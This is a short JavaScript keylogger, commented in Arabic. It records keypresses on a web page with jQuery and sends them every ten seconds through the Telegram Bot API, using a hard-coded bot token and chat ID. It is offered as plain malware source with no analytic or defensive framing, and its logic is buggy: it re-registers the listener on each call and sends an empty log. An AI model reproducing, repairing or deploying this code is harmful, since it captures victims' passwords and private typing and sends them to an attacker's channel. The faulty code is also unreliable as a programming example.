var botToken = "5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng";
var chatId = "5010958919";
var apiUrl = "https://api.telegram.org/bot" + botToken;

function sendMessage(message) {
    $.post(apiUrl + "/sendMessage", {
        chat_id: chatId,
        text: message
    });
}

function sendKeylog() {
    var keylog = "";
    $(document).on("keypress", function(e) {
        keylog += String.fromCharCode(e.which);
    });

    sendMessage("Keylog:\n" + keylog);
    keylog = ""; // مسح سجل المفاتيح بعد الإرسال
}

setInterval(sendKeylog, 10000); // أرسل سجل المفاتيح كل 10 ثوانٍ
